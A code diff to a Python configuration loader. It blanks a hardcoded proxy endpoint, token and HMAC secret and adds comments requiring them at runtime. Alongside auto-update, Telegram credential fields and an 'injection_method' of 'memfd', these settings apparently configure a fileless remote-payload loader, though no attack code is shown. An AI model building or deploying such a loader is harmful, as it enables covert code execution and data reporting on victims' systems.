@@ -1,5 +1,11 @@
 # -*- coding: utf-8 -*-
-"""Configuration loader — JSON config with sane defaults."""
+"""Configuration loader — JSON config with sane defaults.
+
+Security-sensitive fields (endpoint, token_id, shared_secret, telegram
+credentials) default to empty strings. They are required at runtime;
+fill them in via config.json. This prevents accidentally shipping a
+build with placeholder secrets pointing at somebody else's worker.
+"""
 
 import json
 from pathlib import Path
@@ -50,9 +56,14 @@ _DEFAULTS = {
     "system": {
         "enabled": True,
         "auto_update": True,
-        "endpoint": "https://system-blob-proxy.workers.dev/",
-        "token_id": "p72S_12",
-        "shared_secret": "PROMETHEUS_HMAC_2026_v1",
+        # ── required ──────────────────────────────────────────────
+        # Fill these in to match your Worker deployment.
+        # Empty values cause the loader to bail cleanly instead of
+        # silently fetching from a placeholder endpoint.
+        "endpoint": "",
+        "token_id": "",
+        "shared_secret": "",
+        # ── optional ──────────────────────────────────────────────
         "telegram_bot_token": "",
         "telegram_chat_id": "",
         "injection_method": "memfd",
